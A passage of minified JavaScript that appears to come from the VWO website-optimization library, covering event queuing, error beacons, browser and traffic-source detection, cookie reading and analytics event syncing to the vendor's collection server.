      }), this.data = e.data || {}, this.TRACK_SESSION_COOKIE_EXPIRY_CUSTOM = e.TRACK_SESSION_COOKIE_EXPIRY_CUSTOM, this.onEventReceive = e.onEventReceive, this.onVariationApplied = e.onVariationApplied, this.onSurveyShown = e.onSurveyShown, this.onSurveyCompleted = e.onSurveyCompleted, this.onSurveyAnswerSubmitted = e.onSurveyAnswerSubmitted, this.onVWOLoaded = e.onVWOLoaded, this.optOut = dn, this.optInVisitor = gn, this.optOutVisitor = pn, this.tag = e.tag, this.v_e = e.v_e, this.v = e.v;
      let t = 0;
      for (const e of this.queue) this[t] = e, t++;
      this.length = this.queue.length;
    }
    config(e) {
      return e && (this.configSettings = e), this.configSettings;
    }
    definePlugin(e, t = {}) {
      const n = e.split(".")[0],
        o = e.split(".")[1],
        i = window.VWO;
      i.phoenix ? mn(n, o, t) : (i.pluginStorage = i.pluginStorage || {}, i.pluginStorage[n] = i.pluginStorage[n] || {}, o ? (i.pluginStorage[n][o] = i.pluginStorage[n][o] || {}, i.pluginStorage[n][o] = jt.mergeNestedObjects(i.pluginStorage[n][o], t)) : i.pluginStorage[n] = jt.mergeNestedObjects(i.pluginStorage[n], t));
    }
    addPhoenix(e) {
      this.event = function (e, t, n) {
        const o = En(e, t = t || {});
        if (!o) return;
        let i = null;
        de(n) && ("function" == typeof n.cb && (i = n.cb), delete n.cb, o.filteredAttributeObject.$metaData = n), this.otherSide("event", [o.eventName, o.filteredAttributeObject, i]);
      }, this.visitor = function (e, t) {
        if (!e) return;
        const n = fn.filterAttributeObjectKeys(e);
        n && (de(t) && (n.$metaData = t), this.otherSide("visitor", [n]));
      }, this.syncAttributes = function () {
        this.otherSide("syncAttributes", []);
      }, this.syncEvents = function () {
        this.otherSide("syncEvents", []);
      }, this.setVariation = Jt, this.phoenix = e;
    }
    splice(...e) {
      const t = this.queue.splice.apply(this.queue, e);
      return this.length = this.queue.length, t;
    }
    push(...e) {
      const t = this.queue.push.apply(this.queue, e);
      return this.length = this.queue.length, this[this.length - 1] = this.queue[this.queue.length - 1], t;
    }
    sort(...e) {
      return this.queue.sort.apply(this.queue, e);
    }
    updateSettings(e, t) {
      const n = e.tags;
      for (var o in Object.keys(n).forEach(e => {
        n[e].fn = Bt(n[e].fn);
      }), window.VWO._.allSettings.triggers = Object.assign(Object.assign({}, window.VWO._.allSettings.triggers), e.triggers), e.tags) window.VWO._.allSettings.tags[o] || (window.VWO._.allSettings.tags[o] = e.tags[o]);
      this.pageGroup.add(e.pages, e.pagesEval);
      const i = e.dataStore.plugins.PIICONFIG;
      i && (window.VWO._.allSettings.dataStore.plugins.PIICONFIG = {
        globalBlacklist: i.GBBL,
        queryParamSettings: JSON.parse(i.QPS),
        globalValueRegex: i.GVR
      }), delete window.VWO._.goalsToBeConvertedSynchronously;
      const r = !!oe(window.VWO._.track).length;
      this.otherSide("updateSettings", [r, e, t]);
    }
    otherSide(...e) {
      e[0] = "VWO." + e[0], window.fetcher.getValue(...e);
    }
  }
  var Sn = [];
  const Tn = ["dev.visualwebsiteoptimizer.com", "d5phz18u4wuww.cloudfront.net", "cdn-cn.vwo-analytics.com"];
  function Cn(e) {
    let t = !1;
    for (let n = 0; n < Tn.length; n++) if (e.indexOf(Tn[n]) >= 0) {
      t = !0;
      break;
    }
    return t;
  }
  var yn = function (e) {
    if (Cn(e && e.url || "")) for (var t = 0; t < Sn.length; t++) Sn[t](e);
  };
  function In(e) {
    var t = {
      msg: e.error && e.error.stack || e.message || e.reason && (e.reason.stack || e.reason.message),
      url: e.filename || e.reason && (e.reason.stack || e.reason.message),
      lineno: e.lineno,
      colno: e.colno,
      source: "aEL"
    };
    yn(t);
  }
  window.addEventListener ? (window.addEventListener("error", In), window.addEventListener("unhandledrejection", In)) : window.attachEvent && window.attachEvent("onerror", function (e, t, n, o) {
    yn({
      msg: e,
      url: t,
      lineno: n,
      colno: o,
      source: "aE"
    });
  });
  const An = function (e) {
    e && "function" == typeof e && Sn.push(e);
  };
  class Nn {
    formatErrorObject(e) {
      return "string" == typeof e && (e = {
        msg: e
      }), e;
    }
    setCustomError(e) {
      const t = this;
      window.VWO._.customError = function (n) {
        n = t.formatErrorObject(n), e(n);
      };
    }
  }
  let bn;
  class Vn extends Nn {
    setErrorTrackingCallback(e) {
      var t;
      const n = e.encodeURIComponent,
        o = e.accountId,
        i = (null === (t = window.VWO.data.accountJSInfo) || void 0 === t ? void 0 : t.collUrl) || e.serverUrl,
        r = this;
      var s = 0;
      const a = function (e) {
        var t,
          a = (e = e || {}).msg && e.msg.substring(0, 1e3);
        const c = e.lineno,
          d = e.colno,
          l = e.source,
          u = e.url,
          w = bn || r.getEmptyTriggerIdsIfAny(),
          _ = "ee.gif?" + (u ? "f=" + n(e.url) : "") + (c ? "&l=" + c : "") + (d ? "&c=" + e.colno : "") + "&a=" + o + (l ? "&s=" + n(l) : "") + (Array.isArray(w) && w.length ? "&eT=" + n(w.join()) : "") + "&e=" + n(a);
        if (s < 50 && (s++, Xt({
          url: _,
          serverUrl: i
        }, void 0, void 0, !0)), w) {
          null === (t = window._vwo_code) || void 0 === t || t.finish();
          const e = vwo_$('[id^="_vis_opt_path_hides"]');
          if (e.length) for (let t = 0; t < e.length; t++) vwo_$(e[t]).remove();
        }
      };
      return An(a), a;
    }
    getEmptyTriggerIdsIfAny() {
      const {
          triggers: e
        } = window.VWO._.allSettings || {},
        t = [];
      return Object.keys(e).forEach(n => {
        Object.keys(e[n]).length || t.push(n);
      }), bn = t, t;
    }
    errorTracking({
      getters: e
    }) {
      const t = this.setErrorTrackingCallback(e);
      this.setCustomError(t);
    }
  }
  const Rn = new Vn(),
    Ln = Rn.errorTracking.bind(Rn);
  window.VWO.modules.tags = window.VWO.modules.tags || {}, window.VWO.modules.tags.errorTracking = Ln, window.VWO.modules.tags.errorTrackingCallback = Rn.setErrorTrackingCallback;
  var Pn = "undefined",
    Dn = 10;
  function xn(e) {
    return !!e;
  }
  var Un = navigator,
    kn = document,
    Wn = Un.userAgent,
    Mn = Un.vendor,
    Gn = kn.createElement("a"),
    $n = Wn.toLowerCase(),
    Fn = Un.appVersion,
    jn = [{
      s: Wn,
      sS: " OPR/",
      p: window.opera,
      i: "Opera"
    }, {
      s: Mn,
      sS: "Apple",
      i: "Safari"
    }, {
      s: Mn,
      sS: "KDE",
      i: "Konqueror"
    }, {
      s: Wn,
      sS: "Firefox",
      i: "Firefox"
    }, {
      s: Wn,
      sS: "Netscape",
      i: "Netscape"
    }, {
      s: Wn,
      sS: "MSIE",
      p: /(?:Trident\/.*?rv:|Windows NT.*?Edge\/)(?:[0-9]+[.0-9]*)/i.test(Wn),
      i: "Explorer"
    }, {
      s: Wn,
      sS: "Chrome",
      i: "Chrome"
    }],
    Bn = [{
      s: "search.yahoo.com/",
      p: "p",
      i: 1
    }, {
      s: "www.google.",
      p: "q",
      i: 2
    }, {
      s: "www.bing.com/",
      p: "q",
      i: 3
    }, {
      s: ".ask.com/",
      p: "q",
      i: 4
    }, {
      s: "www.search.com/",
      p: "q",
      i: 5
    }, {
      s: "www.baidu.com/",
      p: "wd",
      i: 6
    }, {
      s: "search.aol.com/",
      p: "q",
      i: 7
    }, {
      s: "duckduckgo.com/",
      p: "q",
      i: 8
    }],
    Hn = function (e) {
      return Pn !== typeof e;
    },
    Kn = function () {
      return window.VWO && window.VWO.data && window.VWO.data.vi;
    },
    Jn = function (e) {
      var t = window._vwo_geo;
      return 2 == +e && (t = window._vwo_geo2), t;
    };
  const Yn = {
    ce: function () {
      return Un.cookieEnabled;
    },
    U: function () {
      return kn.URL;
    },
    ks: function () {
      return "" === this.R() ? "" : Gn.search;
    },
    ors: function () {
      for (var e = 0; e < Bn.length; e++) if (-1 !== this.R().indexOf(Bn[e].s)) return Bn[e].i;
      return 0;
    },
    rt: function () {
      return this.ors() ? "org" : this.R() ? "ref" : this.f_in(this.qP("utm_medium"), "email") ? "eml" : this.f_re_i(this.qP("utm_medium"), "^(?:cpc|ppc|cpa|cpm|cpv|cpp)$") ? "spt" : "dir";
    },
    ts: function () {
      let e,
        t,
        n,
        o,
        i = this.R();
      if (/facebook\.com|quora\.com|reddit\.com|imgur\.com|tapiture\.com|disqus\.com|9gag\.com|tumblr\.com|plus\.google|stumbleupon\.com|twitter\.com|linkedin|del\.icio\.us|delicious\.com|technorati|digg\.com| hootsuite|stumbleupon|myspace|bit\.ly|tr\.im|tinyurl|ow\.ly|reddit|m\.facebook\.com|youtube|flickr|pinterest\.com|^t\.co$|tweetdeck/.test(i)) return "soc";
      if (this.ors() && (e = !0), n = this.qP("gclid"), o = this.qP("utm_medium"), i && (t = !0), e && n) return "pst";
      if (o) {
        if (this.f_in(o, "email")) return "eml";
        if (this.f_re_i(o, "^(?:cpc|ppc|cpa|cpm|cpv|cpp)$")) return "pst";
      } else if (e) return "org";
      return t ? "ref" : "dir";
    },
    k: function () {
      if (this.ors()) {
        var e = new RegExp("[\\?&]" + Bn[this.ors() - 1].p + "=([^&#]*)").exec(this.R());
        if (null !== e) return e[1].split("+").join(" ");
      }
      return "";
    },
    gC: function (e) {
      if (VWO._.jar && /^_vis_opt_exp_\d+_combi$/.test(e)) {
        return VWO._.jar.get(e) || "";
      }
      if (0 < kn.cookie.length) {
        var t,
          n = kn.cookie.indexOf(e + "=");
        if (-1 !== n) return n = n + e.length + 1, -1 === (t = kn.cookie.indexOf(";", n)) && (t = kn.cookie.length), decodeURIComponent(kn.cookie.substring(n, t));
      }
      return "";
    },
    T: function () {
      var e = this.gC("_vis_opt_s");
      return e && 1 < parseInt(e.split("|")[0], Dn) ? "ret" : "new";
    },
    qP: function (e) {
      e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
      var t = new RegExp("[\\?&]" + e + "=([^&#]*)").exec(this.U());
      return t ? t[1] : "";
    },
    f_in_loc: function (e, t) {
      return d(this, void 0, void 0, function* () {
        if (e && t) {
          const n = e.countryCode,
            o = e.city,
            i = e.region;
          return (yield Yn.f_in_list(n, t)) || (yield Yn.f_in_list(`${n}-${i}`, t)) || (yield Yn.f_in_list(`${n}-${i}-${o}`, t));
        }
      });
    },
    f_nin_loc: function (e, t) {
      return d(this, void 0, void 0, function* () {
        if (e && t) {
          const n = e.countryCode,
            o = e.city,
            i = e.region;
          return (yield Yn.f_nin_list(n, t)) && (yield Yn.f_nin_list(`${n}-${i}`, t)) && (yield Yn.f_nin_list(`${n}-${i}-${o}`, t));
        }
      });
    },
    f_in_list: function (e, t) {
      return d(this, void 0, void 0, function* () {
        if (!xn(e)) return !1;
        const n = yield window.VWO._.contentSyncService.syncGet("fns.list", [e, t]);
        return !!n.dataPresent && n.val;
      });
    },
    f_nin_list: function (e, t) {
      return d(this, void 0, void 0, function* () {
        if ("" === e) return !0;
        if (!xn(e)) return !1;
        const n = yield window.VWO._.contentSyncService.syncGet("fns.list", [e, t]);
        return !!n.dataPresent && !n.val;
      });
    },
    f_in: function (e, t) {
      return Hn(e) && Hn(t) && e.toString().toLowerCase() === t.toString().toLowerCase();
    },
    f_nin: function (e, t) {
      return !this.f_in(e, t);
    },
    f_cs: function (e, t) {
      return Hn(e) && Hn(t) && e.toString() === t.toString();
    },
    f_ncs: function (e, t) {
      return !this.f_cs(e, t);
    },
    f_re_i: function (e, t) {
      if (!Hn(e) || !Hn(t)) return !1;
      var n = new RegExp(t, "i");
      return (e += "").match(n);
    },
    f_re_s: function (e, t) {
      if (!Hn(e) || !Hn(t)) return !1;
      var n = new RegExp(t);
      return (e += "").match(n);
    },
    f_con: function (e, t) {
      return !(!Hn(e) || !Hn(t)) && e.toString().toLowerCase().indexOf(t.toString().toLowerCase()) > -1;
    },
    f_d_con: function (e, t) {
      return !this.f_con(e, t);
    },
    f_b: function (e) {
      return !e;
    },
    f_n_b: function (e) {
      return !this.f_b(e);
    },
    f_e: function (e, t) {
      var n;
      if ("object" == typeof t) {
        for (n = 0; n < t.length; n++) if (this.f_in(e, t[n])) return !0;
        return !1;
      }
      return this.f_in(e, t);
    },
    wk: function () {
      return $n.indexOf("webkit") > -1;
    },
    de: function () {
      var e = Kn();
      return e && e.de ? e.de : $n.indexOf("ipod") > -1 ? "ipod" : $n.indexOf("ipad") > -1 && this.wk() ? "ipad" : $n.indexOf("iphone") > -1 ? "iphone" : $n.indexOf("android") > -1 ? "android" : $n.indexOf("googletv") > -1 ? "googletv" : $n.indexOf("symbian") > -1 || /series\s*[4-9]0/i.test($n) ? "symbian" : $n.indexOf("blackberry") > -1 || $n.indexOf("vnd.rim") > -1 || $n.indexOf("bb10") > -1 ? "blackberry" : $n.indexOf("windows phone") > -1 ? "winphone" : "";
    },
    dt: function () {
      var e = Kn();
      return e && e.dt || "";
    },
    os: function () {
      var e = Kn();
      return e && e.os ? e.os : -1 !== Fn.indexOf("Win") ? "windows" : -1 !== Fn.indexOf("Mac") ? "macOS" : -1 !== Fn.indexOf("X11") ? "unix" : -1 !== Fn.indexOf("Linux") ? "linux" : void 0;
    },
    b: function () {
      var e = Kn();
      return e && e.br ? e.br : this.sS(jn) || "";
    },
    sS: function (e) {
      var t, n, o;
      for (t = 0; t < e.length; t++) {
        if (n = e[t].s, o = e[t].p, n && -1 !== n.indexOf(e[t].sS)) return e[t].i;
        if (o) return e[t].i;
      }
    },
    jv: function (e) {
      try {
        return window[e] || eval(e);
      } catch (e) {}
    },
    ua: function () {
      return Wn;
    },
    DoW: function () {
      return new Date().getDay().toString();
    },
    Hr: function () {
      return new Date().getHours();
    },
    Co: function (e) {
      var t = Jn(e);
      return Pn !== typeof t && Pn !== typeof t.country ? t.country : "";
    },
    Re: function (e) {
      var t = Jn(e);
      return Pn !== typeof t && Pn !== typeof t.region ? t.region : "";
    },
    Ci: function (e) {
      var t = Jn(e);
      return Pn !== typeof t && Pn !== typeof t.city ? t.city : "";
    },
    ip: function () {
      return window._vwo_ip || "";
    },
    vt: function () {
      var e = window.VWO.data.vi;
      if (e) return e.vt;
    }
  };
  function qn() {
    return Yn;
  }
  Yn.R = function () {
    return Pe.get();
  };
  var Xn = window.console || {
      log: function () {}
    },
    zn;
  window.VWO._.prVWO = window.VWO._.prVWO || [];
  const Zn = {
    processEvent: function (e, t, n, o, i) {
      if ("[object Array]" !== Object.prototype.toString.call(e)) return 0;
      try {
        var r,
          s,
          a,
          c = e[0],
          d = e.slice(1),
          l = -1 !== c.indexOf(".");
        return l && 0 === c.indexOf(t) || !l ? (l ? (r = n[(s = c.split("."))[0]][s[1]], a = n[s[0]]) : (r = n[c], a = n), r ? (window.VWO._.prVWO = window.VWO._.prVWO.concat(i.queue ? i.splice(o, 1) : i.queue), r.apply(a, d), 1) : 0) : 0;
      } catch (t) {
        return Xn.log("Error occured in VWO Process Event (" + (e && e[0]) + "): ", t), 0;
      }
    },
    addPushListener: function (e, t, n) {
      var o = t.push;
      t.push = function (...i) {
        let r = 0;
        return i.forEach(i => {
          r = function (i) {
            const r = o.apply(t, [].slice.call(arguments));
            return t.queue && t.queue[t.queue.length - 1] === i ? Zn.processEvent(i, e, n, t.queue.length - 1, t) : t.queue || t[t.length - 1] !== i || Zn.processEvent(i, e, n, t.length - 1, t), r;
          }(i);
        }), r;
      };
    },
    init: function (e, t, n, o, i = !0) {
      zn = n ? t[n] = t[n] || [] : t || [], this.vwoApi = o, Zn.process(e, zn, t), i && Zn.addPushListener(e, zn, t);
    },
    initTrack: function (e, t) {
      Zn.init(e, window.VWO, t);
    },
    process: function (e, t, n) {
      var o = 0;
      t.sort(function (e) {
        return "config" === e[0] ? -1 : 0;
      });
      const i = t.queue ? t.queue : t;
      for (; o < i.length;) 0 === Zn.processEvent(i[o], e, n, o, t) && o++;
    }
  };
  window.VWO && (window.VWO._ = window.VWO._ || {}, window.VWO._.vwoLib = Zn);
  class Qn {}
  class eo {
    otherSide(...e) {
      return e[0] = "VWO.modules.tags.dataSync." + e[0], window.fetcher.getValue(...e);
    }
  }
  function to(e) {
    window.vwo_iehack_queue || (window.vwo_iehack_queue = []), window.vwo_iehack_queue.push(e);
  }
  function no(e) {
    const {
        data: t,
        apiToUse: n,
        headers: o,
        success: i,
        complete: r,
        error: s
      } = e,
      {
        url: a
      } = e,
      c = n && new (n.get("XMLHttpRequest"))() || new XMLHttpRequest();
    if (c.open("POST", a, !0), o) for (const e in o) o.hasOwnProperty(e) && c.setRequestHeader(e, o[e]);
    t instanceof FormData && (c.formData = t), c.send(t), c.onload = function () {
      i.call(this), r.call(this, e.callbackContext);
    }, c.onerror = function () {
      s.call(this), r.call(this, e.callbackContext);
    };
  }
  function oo(e, t) {
    const {
      apiToUse: n,
      success: o,
      error: i,
      complete: r,
      callbackContext: s
    } = e;
    let {
      url: a
    } = e;
    const c = n && new (n.get("Image"))() || new Image();
    a += t ? "&_bf=1" : "", c.src = a, c.onload = function () {
      o.call(this), r.call(this, s);
    }, c.onerror = function () {
      i.call(this), r.call(this, {
        isError: !0
      });
    }, to(c);
  }
  function io(e, t) {
    e.data ? no(e) : oo(e, false);
  }
  function ro(e) {
    let {
      url: t,
      miscOptions: n
    } = e;
    t.indexOf("?") < 0 && (t += "?");
    return t += n ? "&vn=" + n.vn + "&vns=" + n.vns + "&vno=" + n.vno : "", t.indexOf("&cu=") < 0 && t.indexOf("&url=") < 0 && (t += "&_cu=" + encodeURIComponent(window.VWO._.lastPageUnloadURL || document.URL.slice(0, 100))), document.referrer && t.indexOf("&ru=") < 0 && (t += "&_ru=" + encodeURIComponent(document.referrer.slice(0, 100))), t.indexOf("?&") > 0 && (t = t.replace("?&", "?")), t;
  }
  const so = function (e) {
    const t = function () {};
    let n = !1;
    (e.success || e.error) && (n = !0), e.success = e.success || t, e.error = e.error || t, e.complete = e.complete || t, e.url = ro(e), e.callbackContext = e.callbackContext || {};
    const {
      data: o,
      url: i,
      useBeacon: r,
      complete: s
    } = e;
    if (n && !r) return io(e, !1), {
      typeOfCall: so.callTypes.NONBEACON
    };
    return "function" == typeof navigator.sendBeacon && (window.VWO.data && window.VWO.data.fB || r) && navigator.sendBeacon(i, o) ? (s(e.callbackContext), {
      typeOfCall: so.callTypes.BEACON
    }) : (io(e, !0), {
      typeOfCall: so.callTypes.NONBEACON
    });
  };
  so.shouldCompress = function (e) {
    return e.length > 1800;
  }, so.callTypes = {
    BEACON: "beacon",
    NONBEACON: "non-beacon"
  };
  class ao {
    constructor() {
      this.vwoEventsToBeSynced = {
        [Ke.VARIATION_SHOWN]: {
          ignoreMetricDataCheck: !0
        },
        [Ke.PAGE_VIEW]: {},
        [Ke.DOM_CLICK]: {},
        [Ke.DOM_SUBMIT]: {},
        [Ke.CUSTOM_CONVERSION]: {},
        [Ke.REVENUE_CONVERSION]: {},
        [Ke.SYNC_VISITOR_PROP]: {
          ignoreMetricDataCheck: !0
        },
        [Ke.PAGE_UNLOAD]: {}
      }, this.allowedMetaDataProps = {
        ogName: !0,
        source: !0
      };
    }
    otherSide(...e) {
      return e[0] = "VWO.modules.tags.dataSync.utils." + e[0], window.fetcher.getValue(...e);
    }
    shouldSendEventCall(e, t) {
      var n;
      const o = t.name;
      if (!o) return !1;
      const i = this.vwoEventsToBeSynced[t.name];
      if (void 0 === i && !t.props.isCustomEvent) return !1;
      if (!window.VWO._.allSettings.dataStore.events[o]) {
        let e;
        try {
          e = JSON.parse(window.localStorage.getItem(ao.UNREG_EVENT_LOCAL_STORAGE_NAME)) || {};
        } catch (t) {
          e = {};
        }
        if (e[o]) return !1;
        {
          e[o] = !0;
          const t = JSONStringify(e);
          window.localStorage.setItem(ao.UNREG_EVENT_LOCAL_STORAGE_NAME, t);
        }
      }
      if (t.props.isCustomEvent) return !0;
      if (!i || !i.ignoreMetricDataCheck) {
        const e = null === (n = t._vwo) || void 0 === n ? void 0 : n.eventDataConfig;
        if (!e || Object.keys(e).length <= 0) return !1;
      }
      if (t.name !== Ke.VARIATION_SHOWN) return !0;
      let r = "non-analytics";
      location.href.includes("jsMode=Any") && (r = "analytics");
      const s = null == t ? void 0 : t.props,
        a = null == s ? void 0 : s.id;
      if (!s || !a) return !1;
      const c = e.currentSettings.dataStore.campaigns[a] || window._vwo_exp[a],
        d = window.VWO.modules.utils.libUtils.isSessionBasedCampaign2(c),
        l = "SURVEY" === c.type;
      return !(!("analytics" === r || "non-analytics" === r && s.isFirst) || d || l);
    }
    evaluateDataForEventsCall(e, t, n) {
      var o;
      let i = !0;
      this.syncAdditionalDataWithEventsData(null === (o = n._vwo) || void 0 === o ? void 0 : o.eventDataConfig, n);
      const r = {
        d: {}
      };
      if (r.d.msgId = `${t}-${+new Date()}`, r.d.visId = t, r.d.event = {
        props: this.excludeEventPropsNotToBeSynced(e, n.name, n.props),
        name: n.name,
        time: n.time
      }, n.props.$metaData) {
        const e = {},
          t = n.props.$metaData;
        for (const n in t) Object.prototype.hasOwnProperty.call(this.allowedMetaDataProps, n) && (e[n] = t[n]);
        Object.keys(e).length > 0 && (r.d.event.props.vwoMeta = r.d.event.props.vwoMeta || {}, Object.assign(r.d.event.props.vwoMeta, e)), delete r.d.event.props.$metaData;
      }
      return n.props.$visitor && (r.d.visitor = n.props.$visitor, delete n.props.$visitor, Object.keys(r.d.visitor.props).length <= 0 && (i = !1)), r.d.event.props.page = n.page || this.getPageInfo(), this.resetDataForCurrentEvent(n), {
        payload: r,
        shouldSyncCall: i
      };
    }
    getPageInfo() {
      return De.page;
    }
    syncAdditionalDataWithEventsData(e, t) {
      if (e) for (const n in e) if (Object.prototype.hasOwnProperty.call(e, n) && "shouldSyncData" !== n) {
        const o = e[n];
        if (void 0 === o) continue;
        t.props ? t.props[n] = o : t[n] = o;
      }
    }
    resetDataForCurrentEvent(e) {
      var t;
      let n = (null === (t = e._vwo) || void 0 === t ? void 0 : t.eventDataConfig) || {};
      (n || e.props) && (n = {}, e.props = {});
    }
    excludeEventPropsNotToBeSynced(e, t, n) {
      var o, i, r, s, a, c, d;
      const l = ["fireLinkedTagSync", "isTrusted", "page", "$visitor", "isCustomEvent", "VWO"];
      if (!n.isCustomEvent) {
        const n = (null === (s = null === (r = null === (i = null === (o = e.currentSettings) || void 0 === o ? void 0 : o.dataStore) || void 0 === i ? void 0 : i.events) || void 0 === r ? void 0 : r[t]) || void 0 === s ? void 0 : s.nS) || (null === (d = null === (c = null === (a = window.VWO._.allSettings.dataStore) || void 0 === a ? void 0 : a.events) || void 0 === c ? void 0 : c[t]) || void 0 === d ? void 0 : d.nS) || [];
        Array.prototype.push.apply(l, n);
      }
      if (!l || !l.length) return n;
      const u = {},
        w = window.VWO._.allSettings.dataStore.events[t];
      for (const e in n) if (Object.prototype.hasOwnProperty.call(n, e)) {
        const t = n[e];
        l.indexOf(e) > -1 ? delete u[e] : u[e] = !w && t ? _t(t, 100) : t;
      }
      return u;
    }
  }
  ao.UNREG_EVENT_LOCAL_STORAGE_NAME = "vwoUnregEvents";
  class co extends ao {
    handleDomTriggeredEvent(e) {
      const t = e.name;
      t.indexOf("vwo_dom_") < 0 || (t === Ke.DOM_CLICK && (e.name = "click"), t === Ke.DOM_SUBMIT && (e.name = "submit"));
    }
    sendCall(e, t, n, o, i, r, s) {
      var a;
      if (!xt.shouldWeTrackVisitor()) return;
      const c = null == t ? void 0 : t.successCallback,
        d = null == t ? void 0 : t.errorCallback,
        l = (null === (a = window.VWO.data.accountJSInfo) || void 0 === a ? void 0 : a.collUrl) || De.serverUrl,
        u = De.accountId,
        w = l.endsWith("/");
      let _ = l;
      if (s) _ += `${w ? "" : "/"}events/t?en=${s.name}&a=${u}&v=${window.VWO.v_e}`;else {
        if (!t) return;
        _ = _ + t.url + "&vn=" + t.vn + "&vns=" + t.vns + "&vno=" + t.vno + "&eTime=" + rt() + "&v=" + window.VWO.v_e;
      }
      window.VWO._.isBeaconAvailable = !0, i = window.VWO.data.tB && (window.VWO._.isLinkRedirecting || i);
      so({
        url: _,
        complete: o,
        success: c,
        error: d,
        data: n,
        useBeacon: i,
        callbackContext: r
      }).typeOfCall !== so.callTypes.BEACON && (window.VWO._.isBeaconAvailable = !1);
    }
    addDataFromMTAndSend(e, t, n, o, i, r, s, a) {
      if (o = o || Be, s && s.name === Ke.VARIATION_SHOWN && (s.props.extraData = Wt.extraData2(), "SPLIT_URL" == _vwo_exp[a].type)) {
        const e = o;
        o = function () {
          e(r), window.VWO._.phoenixMT.trigger(`vwo_vSCallSent_${a}`), _vwo_exp[a].vSCallSent = !0;
        };
      }
      this.sendCall(e, t, n, o, i, r, s);
    }
    getDataForEventsCall(e, t, n) {
      const o = window.VWO.modules.tags.sessionInfoService;
      let {
        payload: i,
        shouldSyncCall: r
      } = this.evaluateDataForEventsCall(e, t, n);
      return i.d.sessionId = o.getSessionId(), {
        data: JSONStringify(i),
        shouldSyncCall: r
      };
    }
  }
  const lo = new co();
  window.VWO.modules.tags.dataSync = {
    utils: lo
  };
  var uo = new co();
  class wo extends eo {
    execute({
      event: e
    }, t, n, o, i, r) {
      if (o = o || Be, window._vis_debug) o && o(i);else if (uo.shouldSendEventCall({
        eventDataConfig: t
      }, e)) {
        r = r || Wt.createUUIDCookie2(n);
        const {
          data: s,
          shouldSyncCall: a
        } = uo.getDataForEventsCall({
          eventDataConfig: t
        }, r, e);
        a && uo.sendCall(null, null, s, o, !0, i, e);
      } else o && o(i);
    }
  }
  const _o = new wo(),
    go = _o.execute.bind(_o);
  function po(e, t) {
    var n;
    const o = e.conflictingPropsData || {};
    if (!e.props) {
      e.props = {};
      const n = ["name", "props", "_vwo", "_meta", "conflictingPropsData"];
      for (const t in e) Object.prototype.hasOwnProperty.call(e, t) && (n.includes(t) || (e.props[t] = e[t]));
      Object.assign(e.props, o), Object.keys(t).forEach(n => {
        e.props[n] = t[n];
      });
    }
    e.time = e.time || (null === (n = e.VWO) || void 0 === n ? void 0 : n.firedTime) || +new Date();
  }
  window.VWO.modules.tags.dataSync = Object.assign(window.VWO.modules.tags.dataSync, go);
  class ho {
    toAbsURL(e) {
      return new URL(e, document.baseURI).href;
    }
    isHashPresent(e) {
      return -1 !== e.indexOf("#");
    }
    isQueryParamPresent(e, t) {
      var n = e.indexOf("#"),
        o = e.indexOf("?"),
        i = t ? -1 : e.indexOf("=");
      return -1 === n ? -1 !== o || -1 !== i : -1 !== o && n > o || -1 !== i && n > i;
    }
    otherSide(...e) {
      return e[0] = "VWO.modules.vwoUtils.urlUtils." + e[0], window.fetcher.getValue(...e);
    }
  }
  class vo extends ho {
    getUrlVars(e) {
      var t,
        n,
        o,
        i = {};
      for (-1 !== e.indexOf("#") && (e = e.slice(0, e.indexOf("#"))), n = (o = e.slice(e.indexOf("?") + 1).split("&").reverse()).length; n--;) if (void 0 === i[(t = o[n].split("="))[0]]) {
        let e = t[1];
        (478778 == window._vwo_acc_id || window._vwo_acc_id > 495077) && (e = t.slice(1).join("=")), i[t[0]] = e;
      } else i[t[0]] = i[t[0]] + "&" + t[0] + "=" + t[1];
      return i;
    }
  }
  const fo = new vo();
  function Eo(e, t, n, o = null) {
    return window.fetcher.getValue('VWO.modules.events.fireEventAndSyncData("${{1}}","${{2}}","${{3}}", "${{4}}" )', null, {
      captureGroups: [null, t, n, o]
    });
  }
  function mo(e, t, n = {}, o = null) {
    var i;
    let r;
    t.name = e || t.name, po(t, n), t.name === Ke.DOM_SUBMIT || t.name === Ke.DOM_CLICK && t.targetUrl ? t.props.targetUrl = t.targetUrl = fo.toAbsURL(t.targetUrl) : t.name === Ke.VARIATION_SHOWN && (r = window._vwo_exp[t.props.id]);
    const s = null === (i = t._vwo) || void 0 === i ? void 0 : i.eventDataConfig;
    if (s) {
      const e = Object.keys(s);
      for (let n = e.length - 1; n >= 0; --n) {
        const i = e[n];
        t._vwo.eventDataConfig = s[i], delete s[i], go({
          event: t
        }, s, null, o, null, i);
      }
    } else go({
      event: t
    }, r);
  }
  window.VWO.modules.vwoUtils.urlUtils = fo, window.VWO.modules.events = {
    syncEventsDataToDataLayer: mo
  };
  class Oo {}
  const So = function () {
      let e;
      if (window.VWO._.eventsManager) return window.VWO._.eventsManager;
      var t = [],
        n = !0,
        o = [],
        i = [],
        r = {
          bind: "unbind",
          live: "die",
          on: "off"
        },
        s = [];
      var a = /iPhone|iPad/.test(navigator.userAgent);
      function c(e) {
        return !window.VWO.DONT_IOS && (!("touchmove" !== e && "touchstart" !== e && "touchend" !== e || !a) || void 0);
      }
      function d(e, t) {
        n && s.push({
          type: e,
          state: t,
          ref: e[t]
        });
      }
      function l() {
        for (var e = s.length - 1; e >= 0; e--) {
          var t = s[e];
          t.type[t.state] = t.ref;
        }
      }
      return e = {
        addEventListener: function (o, i, r, s) {
          if (!c(i)) return n && t.push({
            $el: o,
            name: i,
            callback: r,
            capture: s
          }), o.addEventListener ? o.addEventListener(i, r, s) : o.attachEvent && o.attachEvent("on" + i, r, s), e;
        },
        addMutationObserver: function (e, t, n, o) {
          var r;
          if (void 0 !== window.MutationObserver ? r = window.MutationObserver : void 0 !== window.WebKitMutationObserver && (r = window.WebKitMutationObserver), r) try {
            const r = new MutationObserver(e.bind(o));
            i.push(r), r.observe(t, n);
          } catch (e) {}
        },
        clearAllListeners: function () {
          for (var n = 0; n < t.length; n++) {
            var a = t[n],
              c = a.$el;
            a.jqType ? (d = c, u = a.jqType, w = a.eventName, _ = a.callback, g = a.selector, p = a.capture, u && (g ? d[r[u]] && d[r[u]](w, g, _, p) : d[r[u]] && d[r[u]](w, _, p))) : c.removeEventListener ? c.removeEventListener(a.name, a.callback, a.capture) : c.detachEvent && c.detachEvent("on" + a.name, a.callback);
          }
          var d, u, w, _, g, p;
          return i.forEach(e => {
            e.disconnect();
          }), function () {
            for (var e = 0; e < o.length; e++) {
              var t = o[e];
              "interval" === t.type ? clearInterval(t.name) : clearTimeout(t.name);
            }
